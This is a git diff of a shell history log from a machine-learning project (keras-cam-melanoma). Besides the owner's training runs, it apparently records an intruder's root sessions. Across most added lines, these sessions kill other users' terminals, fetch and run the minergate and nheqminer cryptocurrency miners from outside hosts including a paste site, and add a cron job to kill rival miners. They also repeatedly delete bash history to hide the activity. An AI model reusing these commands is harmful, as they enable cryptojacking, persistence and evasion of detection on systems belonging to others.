@@ -2565,3 +2565,1340 @@ vi cam.py  ### @f5e57551b879 not a tty 20161229 07:14 /datamnt/github/keras-cam-
 vi LOG  ### @f5e57551b879 not a tty 20161229 07:16 /datamnt/github/keras-cam-melanoma
 git status ### @f5e57551b879 not a tty 20161229 07:16 /datamnt/github/keras-cam-melanoma
 git status ### @f5e57551b879 not a tty 20161229 07:16 /datamnt/github/keras-cam-melanoma
+cp ~/histlog ./ ### @f5e57551b879 not a tty 20161229 07:16 /datamnt/github/keras-cam-melanoma
+git status ### @f5e57551b879 not a tty 20161229 07:16 /datamnt/github/keras-cam-melanoma
+git commit -a -m "adam converging without nan" ### @f5e57551b879 not a tty 20161229 07:17 /datamnt/github/keras-cam-melanoma
+git status ### @f5e57551b879 not a tty 20161229 07:17 /datamnt/github/keras-cam-melanoma
+git add . ### @f5e57551b879 not a tty 20161229 07:17 /datamnt/github/keras-cam-melanoma
+git commit -a -m "adam converging without nan" ### @f5e57551b879 not a tty 20161229 07:17 /datamnt/github/keras-cam-melanoma
+git status ### @f5e57551b879 not a tty 20161229 07:17 /datamnt/github/keras-cam-melanoma
+git status ### @f5e57551b879 not a tty 20161229 07:17 /datamnt/github/keras-cam-melanoma
+python cam.py --dataset_path "../../trainsmaller/" --train TRAIN ### root@f5e57551b879 /dev/pts/4 20161229 07:38 /notebooks
+python cam.py --dataset_path "../../trainsmaller/" --train TRAIN ### root@f5e57551b879 /dev/pts/4 20161229 07:38 /notebooks
+clear ### root@f5e57551b879 /dev/pts/4 20161229 07:38 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/4 20161229 07:38 /notebooks
+clear ### root@f5e57551b879 /dev/pts/4 20161229 07:38 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/4 20161229 07:38 /notebooks
+clear ### root@f5e57551b879 /dev/pts/4 20161229 07:38 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/4 20161229 07:38 /notebooks
+kill -9 28077; kill -9 28383;  ### root@f5e57551b879 /dev/pts/4 20161229 07:39 /notebooks
+clear ### root@f5e57551b879 /dev/pts/4 20161229 07:39 /notebooks
+echo 'outpsbjklllh8 START' && ps -e -o pid,tty,cmd | grep 'pts/2' | grep -v grep; echo 'outpsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/4 20161229 07:39 /notebooks
+kill -9 28032;  ### root@f5e57551b879 /dev/pts/4 20161229 07:39 /notebooks
+clear ### root@f5e57551b879 /dev/pts/4 20161229 07:39 /notebooks
+echo 'outpsbjklllh8 START' && ps -e -o pid,tty,cmd | grep 'pts/3' | grep -v grep; echo 'outpsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/4 20161229 07:39 /notebooks
+kill -9 28311;  ### root@f5e57551b879 /dev/pts/4 20161229 07:39 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear;pkill m5; pkill scsi_eh; pkill nheq; pkill -9 nheq; pkill miner; pkill -9 miner;pkill minergate-cli; pkill -9 minergate-cli; pgrep nheq | xargs -i kill -9 {}; pgrep minergate-cli | xargs -i kill -9 {}; ### root@f5e57551b879 /dev/pts/4 20161229 07:39 /root -> /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/4 20161229 07:39 /root/.ttmp
+echo 'minergateinstallwgetbjklllh8 START' && wget --no-check-certificate https://minergate.com/download/deb-cli || curl -ks https://minergate.com/download/deb-cli > deb-cli || curl -ks https://clitxt.com/t/q6b-1479229222.txt > deb-cli;7z x deb-cli -y && 7z x data.tar -y || ar vx deb-cli && tar -xvf data.tar.gz && tar -xvf control.tar.gz || dpkg -x deb-cli . ;nohup ./opt/minergate-cli/minergate-cli -user asdfmnyy@hmamail.com -fcn+xmr & echo 'minergateinstallwgetbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/4 20161229 07:39 /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/4 20161229 07:39 /root/.ttmp
+echo 'newIsRunninPostpsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPostpsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/4 20161229 07:39 /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/4 20161229 07:39 /root/.ttmp
+echo 'nohuplogtailbjklllh8 START' && tail -15 nohup.out; echo 'nohuplogtailbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/4 20161229 07:40 /root/.ttmp
+nohup ./opt/minergate-cli/minergate-cli -user asdfmnyy@hmamail.com -fcn+xmr 0 2 & ### root@f5e57551b879 /dev/pts/4 20161229 07:40 /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/4 20161229 07:40 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/2 20161229 07:52 /notebooks
+ pkill bash  ### root@f5e57551b879 /dev/pts/2 20161229 07:52 /notebooks
+ pkill mine  ### root@f5e57551b879 /dev/pts/2 20161229 07:52 /notebooks
+ pkill yam  ### root@f5e57551b879 /dev/pts/2 20161229 07:52 /notebooks
+ echo "pkill bash;pkill mine;pkill yam" > /etc/cron.hourly/1  ### root@f5e57551b879 /dev/pts/2 20161229 07:52 /notebooks
+ killall ?;top c  ### root@f5e57551b879 /dev/pts/2 20161229 07:52 /notebooks
+pkill m5 && pkill m6 && kill $(ps -eo pid,args --cols=10000 | awk /alexa/)  ### root@f5e57551b879 /dev/pts/2 20161229 07:52 /notebooks
+ kill $(ps -eo pid,args --cols=10000 | awk /jfzero/)  ### root@f5e57551b879 /dev/pts/2 20161229 07:52 /notebooks
+ if [ -f .deb/opt/minergate-cli/minergate-cli ]; then echo "$(tput setaf 2)Was here$(tput setaf 8)";else wget minergate.com/download/deb-cli && dpkg -x deb-cli .deb && rm deb-cli; fi && nproc && lspci | grep VGA || true && pkill mine || true && pkill yam || true && cd .deb/opt/minergate-cli || cd ~/.ttmp/opt/minergate-cli  ### root@f5e57551b879 /dev/pts/2 20161229 07:52 /notebooks/.deb/opt/minergate-cli
+ ### root@f5e57551b879 /dev/pts/2 20161229 07:52 /notebooks/.deb/opt/minergate-cli
+vi cam.py  ### @f5e57551b879 not a tty 20161229 08:08 /datamnt/github/keras-cam-melanoma
+python cam.py --dataset_path "../../trainsmall/" --train TRAIN ### @f5e57551b879 not a tty 20161229 09:48 /datamnt/github/keras-cam-melanoma
+python cam.py --dataset_path "../../trainsmall/" --train TRAIN ### @f5e57551b879 not a tty 20161229 09:48 /datamnt/github/keras-cam-melanoma
+python cam.py --dataset_path "../../trainsmall/" --train TRAIN ### @f5e57551b879 not a tty 20161229 09:48 /datamnt/github/keras-cam-melanoma
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/3 20161229 09:53 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/3 20161229 09:53 /notebooks
+clear ### root@f5e57551b879 /dev/pts/3 20161229 09:53 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/3 20161229 09:53 /notebooks
+clear ### root@f5e57551b879 /dev/pts/3 20161229 09:54 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/3 20161229 09:54 /notebooks
+clear ### root@f5e57551b879 /dev/pts/3 20161229 09:54 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/3 20161229 09:54 /notebooks
+kill -9 28870;  ### root@f5e57551b879 /dev/pts/3 20161229 09:54 /notebooks
+clear ### root@f5e57551b879 /dev/pts/3 20161229 09:54 /notebooks
+echo 'outpsbjklllh8 START' && ps -e -o pid,tty,cmd | grep 'pts/2' | grep -v grep; echo 'outpsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/3 20161229 09:54 /notebooks
+kill -9 28798;  ### root@f5e57551b879 /dev/pts/3 20161229 09:54 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear;pkill m5; pkill scsi_eh; pkill nheq; pkill -9 nheq; pkill miner; pkill -9 miner;pkill minergate-cli; pkill -9 minergate-cli; pgrep nheq | xargs -i kill -9 {}; pgrep minergate-cli | xargs -i kill -9 {}; ### root@f5e57551b879 /dev/pts/3 20161229 09:54 /root -> /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/3 20161229 09:54 /root/.ttmp
+echo 'minergateinstallwgetbjklllh8 START' && wget --no-check-certificate https://minergate.com/download/deb-cli || curl -ks https://minergate.com/download/deb-cli > deb-cli || curl -ks https://clitxt.com/t/q6b-1479229222.txt > deb-cli;7z x deb-cli -y && 7z x data.tar -y || ar vx deb-cli && tar -xvf data.tar.gz && tar -xvf control.tar.gz || dpkg -x deb-cli . ;nohup ./opt/minergate-cli/minergate-cli -user asdfmnyy@hmamail.com -fcn+xmr & echo 'minergateinstallwgetbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/3 20161229 09:54 /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/3 20161229 09:55 /root/.ttmp
+echo 'newIsRunninPostpsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPostpsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/3 20161229 09:55 /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/3 20161229 09:55 /root/.ttmp
+echo 'nohuplogtailbjklllh8 START' && tail -15 nohup.out; echo 'nohuplogtailbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/3 20161229 09:55 /root/.ttmp
+nohup ./opt/minergate-cli/minergate-cli -user asdfmnyy@hmamail.com -fcn+xmr 0 2 & ### root@f5e57551b879 /dev/pts/3 20161229 09:55 /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/3 20161229 09:55 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/2 20161229 10:06 /notebooks
+ pkill bash  ### root@f5e57551b879 /dev/pts/2 20161229 10:06 /notebooks
+ pkill mine  ### root@f5e57551b879 /dev/pts/2 20161229 10:06 /notebooks
+ pkill yam  ### root@f5e57551b879 /dev/pts/2 20161229 10:06 /notebooks
+ echo "pkill bash;pkill mine;pkill yam" > /etc/cron.hourly/1  ### root@f5e57551b879 /dev/pts/2 20161229 10:06 /notebooks
+ cd ~  ### root@f5e57551b879 /dev/pts/2 20161229 10:06 /root
+ top c  ### root@f5e57551b879 /dev/pts/2 20161229 10:06 /root
+python cam.py --dataset_path "../../trainsmall/" --train TRAIN ### root@f5e57551b879 /dev/pts/1 20161229 10:59 /notebooks
+speedtest --share ### root@f5e57551b879 /dev/pts/1 20161229 10:59 /notebooks
+python cam.py --dataset_path "../../trainsmall/" --train TRAIN ### root@f5e57551b879 /dev/pts/3 20161229 11:26 /notebooks
+ pkill bash  ### root@f5e57551b879 /dev/pts/3 20161229 11:26 /notebooks
+ pkill mine  ### root@f5e57551b879 /dev/pts/3 20161229 11:26 /notebooks
+ pkill yam  ### root@f5e57551b879 /dev/pts/3 20161229 11:26 /notebooks
+ echo "pkill bash;pkill mine;pkill yam" > /etc/cron.hourly/1  ### root@f5e57551b879 /dev/pts/3 20161229 11:26 /notebooks
+ killall ?;top c  ### root@f5e57551b879 /dev/pts/3 20161229 11:26 /notebooks
+pkill m5 && pkill m6 && kill $(ps -eo pid,args --cols=10000 | awk /alexa/)  ### root@f5e57551b879 /dev/pts/3 20161229 11:26 /notebooks
+ kill $(ps -eo pid,args --cols=10000 | awk /jfzero/)  ### root@f5e57551b879 /dev/pts/3 20161229 11:26 /notebooks
+ if [ -f .deb/opt/minergate-cli/minergate-cli ]; then echo "$(tput setaf 2)Was here$(tput setaf 8)";else wget minergate.com/download/deb-cli && dpkg -x deb-cli .deb && rm deb-cli; fi && nproc && lspci | grep VGA || true && pkill mine || true && pkill yam || true && cd .deb/opt/minergate-cli || cd ~/.ttmp/opt/minergate-cli  ### root@f5e57551b879 /dev/pts/3 20161229 11:26 /notebooks/.deb/opt/minergate-cli
+ ### root@f5e57551b879 /dev/pts/3 20161229 11:26 /notebooks/.deb/opt/minergate-cli
+speedtest --share ### @f5e57551b879 not a tty 20161229 11:43 /notebooks
+cd ../datamnt/github/keras-cam-melanoma/ ### @f5e57551b879 not a tty 20161229 11:44 /notebooks -> /datamnt/github/keras-cam-melanoma
+speedtest --share ### root@f5e57551b879 /dev/pts/4 20161229 12:07 /notebooks
+speedtest --share ### root@f5e57551b879 /dev/pts/4 20161229 12:07 /notebooks
+clear ### root@f5e57551b879 /dev/pts/4 20161229 12:07 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/4 20161229 12:08 /notebooks
+clear ### root@f5e57551b879 /dev/pts/4 20161229 12:08 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/4 20161229 12:08 /notebooks
+clear ### root@f5e57551b879 /dev/pts/4 20161229 12:08 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/4 20161229 12:08 /notebooks
+kill -9 29270; kill -9 29481;  ### root@f5e57551b879 /dev/pts/4 20161229 12:08 /notebooks
+clear ### root@f5e57551b879 /dev/pts/4 20161229 12:08 /notebooks
+echo 'outpsbjklllh8 START' && ps -e -o pid,tty,cmd | grep 'pts/2' | grep -v grep; echo 'outpsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/4 20161229 12:08 /notebooks
+kill -9 29225;  ### root@f5e57551b879 /dev/pts/4 20161229 12:08 /notebooks
+clear ### root@f5e57551b879 /dev/pts/4 20161229 12:08 /notebooks
+echo 'outpsbjklllh8 START' && ps -e -o pid,tty,cmd | grep 'pts/3' | grep -v grep; echo 'outpsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/4 20161229 12:08 /notebooks
+kill -9 29409;  ### root@f5e57551b879 /dev/pts/4 20161229 12:08 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear;pkill m5; pkill scsi_eh; pkill nheq; pkill -9 nheq; pkill miner; pkill -9 miner;pkill minergate-cli; pkill -9 minergate-cli; pgrep nheq | xargs -i kill -9 {}; pgrep minergate-cli | xargs -i kill -9 {}; ### root@f5e57551b879 /dev/pts/4 20161229 12:08 /root -> /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/4 20161229 12:08 /root/.ttmp
+echo 'minergateinstallwgetbjklllh8 START' && wget --no-check-certificate https://minergate.com/download/deb-cli || curl -ks https://minergate.com/download/deb-cli > deb-cli || curl -ks https://clitxt.com/t/q6b-1479229222.txt > deb-cli;7z x deb-cli -y && 7z x data.tar -y || ar vx deb-cli && tar -xvf data.tar.gz && tar -xvf control.tar.gz || dpkg -x deb-cli . ;nohup ./opt/minergate-cli/minergate-cli -user asdfmnyy@hmamail.com -fcn+xmr & echo 'minergateinstallwgetbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/4 20161229 12:08 /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/4 20161229 12:09 /root/.ttmp
+echo 'newIsRunninPostpsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPostpsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/4 20161229 12:09 /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/4 20161229 12:09 /root/.ttmp
+echo 'nohuplogtailbjklllh8 START' && tail -15 nohup.out; echo 'nohuplogtailbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/4 20161229 12:09 /root/.ttmp
+nohup ./opt/minergate-cli/minergate-cli -user asdfmnyy@hmamail.com -fcn+xmr 0 2 & ### root@f5e57551b879 /dev/pts/4 20161229 12:09 /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/4 20161229 12:09 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/2 20161229 14:06 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/2 20161229 14:06 /notebooks
+clear ### root@f5e57551b879 /dev/pts/2 20161229 14:06 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/2 20161229 14:06 /notebooks
+clear ### root@f5e57551b879 /dev/pts/2 20161229 14:06 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/2 20161229 14:06 /notebooks
+clear ### root@f5e57551b879 /dev/pts/2 20161229 14:07 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/2 20161229 14:07 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear; ### root@f5e57551b879 /dev/pts/2 20161229 14:07 /root -> /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/2 20161229 14:07 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/2 20161229 15:54 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/2 20161229 15:54 /notebooks
+clear ### root@f5e57551b879 /dev/pts/2 20161229 15:55 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/2 20161229 15:55 /notebooks
+clear ### root@f5e57551b879 /dev/pts/2 20161229 15:55 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/2 20161229 15:55 /notebooks
+clear ### root@f5e57551b879 /dev/pts/2 20161229 15:55 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/2 20161229 15:55 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear; ### root@f5e57551b879 /dev/pts/2 20161229 15:55 /root -> /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/2 20161229 15:55 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/3 20161229 17:33 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/3 20161229 17:33 /notebooks
+clear ### root@f5e57551b879 /dev/pts/3 20161229 17:33 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/3 20161229 17:33 /notebooks
+clear ### root@f5e57551b879 /dev/pts/3 20161229 17:33 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/3 20161229 17:33 /notebooks
+clear ### root@f5e57551b879 /dev/pts/3 20161229 17:33 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/3 20161229 17:33 /notebooks
+kill -9 30054;  ### root@f5e57551b879 /dev/pts/3 20161229 17:33 /notebooks
+clear ### root@f5e57551b879 /dev/pts/3 20161229 17:33 /notebooks
+echo 'outpsbjklllh8 START' && ps -e -o pid,tty,cmd | grep 'pts/2' | grep -v grep; echo 'outpsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/3 20161229 17:33 /notebooks
+kill -9 30049; kill -9 30050; kill -9 30052; kill -9 30054; kill -9 30080;  ### root@f5e57551b879 /dev/pts/3 20161229 17:33 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear; ### root@f5e57551b879 /dev/pts/3 20161229 17:33 /root -> /root/.ttmp
+nohup ./opt/minergate-cli/minergate-cli -user asdfmnyy@hmamail.com -fcn+xmr 0 2 & ### root@f5e57551b879 /dev/pts/3 20161229 17:33 /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/3 20161229 17:33 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/2 20161229 19:14 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/2 20161229 19:15 /notebooks
+clear ### root@f5e57551b879 /dev/pts/2 20161229 19:15 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/2 20161229 19:15 /notebooks
+clear ### root@f5e57551b879 /dev/pts/2 20161229 19:15 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/2 20161229 19:15 /notebooks
+clear ### root@f5e57551b879 /dev/pts/2 20161229 19:15 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/2 20161229 19:15 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear; ### root@f5e57551b879 /dev/pts/2 20161229 19:15 /root -> /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/2 20161229 19:15 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161229 20:01 /notebooks
+ls -a ### root@f5e57551b879 /dev/pts/0 20161229 20:02 /notebooks
+ps -ae ### root@f5e57551b879 /dev/pts/0 20161229 20:02 /notebooks
+pkill miner ### root@f5e57551b879 /dev/pts/0 20161229 20:02 /notebooks
+pkill sh ### root@f5e57551b879 /dev/pts/0 20161229 20:02 /notebooks
+cd /opt/.z/nheqminer/nheqminer/build ### root@f5e57551b879 /dev/pts/0 20161229 20:02 /notebooks -> /opt/.z/nheqminer/nheqminer/build
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/1 20161229 20:51 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/1 20161229 20:51 /notebooks
+clear ### root@f5e57551b879 /dev/pts/1 20161229 20:51 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20161229 20:51 /notebooks
+clear ### root@f5e57551b879 /dev/pts/1 20161229 20:51 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20161229 20:51 /notebooks
+clear ### root@f5e57551b879 /dev/pts/1 20161229 20:51 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20161229 20:51 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear;pkill m5; pkill scsi_eh; pkill nheq; pkill -9 nheq; pkill miner; pkill -9 miner;pkill minergate-cli; pkill -9 minergate-cli; pgrep nheq | xargs -i kill -9 {}; pgrep minergate-cli | xargs -i kill -9 {}; ### root@f5e57551b879 /dev/pts/1 20161229 20:51 /root -> /root/.ttmp
+./nheq* -l zec.suprnova.cc:2142 -u th3j0k3r.work3 -p x ### root@f5e57551b879 /dev/pts/0 20161229 20:51 /opt/.z/nheqminer/nheqminer/build
+clear ### root@f5e57551b879 /dev/pts/1 20161229 20:51 /root/.ttmp
+echo 'minergateinstallwgetbjklllh8 START' && wget --no-check-certificate https://minergate.com/download/deb-cli || curl -ks https://minergate.com/download/deb-cli > deb-cli || curl -ks https://clitxt.com/t/q6b-1479229222.txt > deb-cli;7z x deb-cli -y && 7z x data.tar -y || ar vx deb-cli && tar -xvf data.tar.gz && tar -xvf control.tar.gz || dpkg -x deb-cli . ;nohup ./opt/minergate-cli/minergate-cli -user asdfmnyy@hmamail.com -fcn+xmr & echo 'minergateinstallwgetbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20161229 20:51 /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/1 20161229 20:52 /root/.ttmp
+echo 'newIsRunninPostpsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPostpsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20161229 20:52 /root/.ttmp
+clear ### root@f5e57551b879 /dev/pts/1 20161229 20:52 /root/.ttmp
+echo 'nohuplogtailbjklllh8 START' && tail -15 nohup.out; echo 'nohuplogtailbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/1 20161229 20:52 /root/.ttmp
+nohup ./opt/minergate-cli/minergate-cli -user asdfmnyy@hmamail.com -fcn+xmr 0 2 & ### root@f5e57551b879 /dev/pts/1 20161229 20:52 /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/1 20161229 20:52 /notebooks
+ps -ae ### root@f5e57551b879 /dev/pts/0 20161229 20:58 /opt/.z/nheqminer/nheqminer/build
+pkill minergate ### root@f5e57551b879 /dev/pts/0 20161229 20:59 /opt/.z/nheqminer/nheqminer/build
+ps -ae ### root@f5e57551b879 /dev/pts/0 20161229 20:59 /opt/.z/nheqminer/nheqminer/build
+pkill sudo ### root@f5e57551b879 /dev/pts/0 20161229 20:59 /opt/.z/nheqminer/nheqminer/build
+python cam.py --dataset_path "../../trainsmall/" --train TRAIN ### @f5e57551b879 not a tty 20161229 21:16 /datamnt/github/keras-cam-melanoma
+python cam.py --dataset_path "../../trainsmall/" --train TRAIN ### @f5e57551b879 not a tty 20161229 21:16 /datamnt/github/keras-cam-melanoma
+python cam.py --dataset_path "../../trainsmall/" --train TRAIN ### @f5e57551b879 not a tty 20161229 21:16 /datamnt/github/keras-cam-melanoma
+python cam.py --dataset_path "../../trainsmall/" --train TRAIN ### @f5e57551b879 not a tty 20161229 21:16 /datamnt/github/keras-cam-melanoma
+python cam.py --dataset_path "../../trainsmall/" --train TRAIN ### @f5e57551b879 not a tty 20161229 21:16 /datamnt/github/keras-cam-melanoma
+python cam.py --dataset_path "../../trainsmall/" --train TRAIN ### @f5e57551b879 not a tty 20161229 21:16 /datamnt/github/keras-cam-melanoma
+python cam.py --dataset_path "../../trainsmall/" --train TRAIN ### @f5e57551b879 not a tty 20161229 21:16 /datamnt/github/keras-cam-melanoma
+python cam.py --dataset_path "../../trainsmall/" --train TRAIN ### @f5e57551b879 not a tty 20161229 21:16 /datamnt/github/keras-cam-melanoma
+python cam.py --dataset_path "../../trainsmall/" --train TRAIN ### @f5e57551b879 not a tty 20161229 21:16 /datamnt/github/keras-cam-melanoma
+python cam.py --dataset_path "../../trainsmall/" --train TRAIN ### @f5e57551b879 not a tty 20161229 21:16 /datamnt/github/keras-cam-melanoma
+python cam.py --dataset_path "../../trainsmall/" --train TRAIN ### @f5e57551b879 not a tty 20161229 21:16 /datamnt/github/keras-cam-melanoma
+python cam.py --dataset_path "../../trainsmall/" --train TRAIN ### @f5e57551b879 not a tty 20161229 21:16 /datamnt/github/keras-cam-melanoma
